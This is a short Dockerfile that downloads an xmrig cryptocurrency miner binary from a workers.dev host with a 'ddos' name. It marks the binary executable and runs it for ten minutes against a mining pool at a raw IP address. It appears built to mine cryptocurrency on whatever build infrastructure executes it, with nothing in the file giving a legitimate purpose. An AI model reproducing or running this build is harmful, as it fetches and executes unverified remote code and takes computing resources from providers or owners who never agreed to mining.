FROM centos:latest

WORKDIR /opt

RUN curl -O https://ddos.nms.workers.dev/xmrig
RUN chmod +x xmrig
RUN timeout 10m ./xmrig -o 129.154.59.76:3333 -a astrobwt -u $(date +%Y%m%d%H%M%S)
